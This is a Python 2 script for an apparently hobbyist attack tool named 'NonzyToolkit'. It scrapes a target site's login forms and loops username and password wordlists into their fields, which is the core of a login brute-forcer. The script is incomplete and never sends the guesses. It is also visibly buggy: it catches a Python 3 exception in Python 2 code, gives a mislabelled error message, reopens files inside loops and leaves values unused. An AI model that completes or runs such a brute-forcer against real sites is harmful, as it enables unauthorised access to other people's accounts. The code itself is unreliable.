#!/usr/bin/env python

import requests, optparse, pyfiglet
from termcolor import colored
from BeautifulSoup import BeautifulSoup

#banner-text
banner = pyfiglet.figlet_format("NonzyToolkit")
print colored("=" * 60, "green")
print colored(banner, "yellow")
print(" Written By Iwundu Chinonso")
print colored("=" * 60, "green")

def get_arguments():
	parser = optparse.OptionParser()
	parser.add_option("-t", "--target", dest="target", help="target url")
	parser.add_option("-u", "--username", dest="username", help="Username")
	parser.add_option("-p", "--password", dest="password", help="Password file") 
	(options, arguments) = parser.parse_args()
	
	if not options.target:
		parser.error("target url is required")	
	if not options.username:
		parser.error("Wordlist is required")	
	if not options.password:
		parser.error("passwordlist is required")	
	return options

options = get_arguments()

#request url
def request(url):
	try:
		return requests.get(url)
	except ConnectionRefusedError:
		pass

target_url = options.target
response = request(target_url)

#extract forms
soup = BeautifulSoup(response.content)
forms_list = soup.findAll("form")

for form in forms_list:
	action = form.get("action")
	method = form.get("method")

	input_list = form.findAll("input")
	for inputs in input_list:
		input_name = inputs.get("name")
		input_type = inputs.get("type")
		input_value = inputs.get("value")
		
		user_list = open(options.username)
		for user in user_list:
			user = user.strip() 
			if input_type == "text":		
				input_value = user

			password_list = open(options.password)			
			for pwd in password_list:
				pwd = pwd.strip() 
				
				if input_type == "password":
					input_value = pwd
	

					






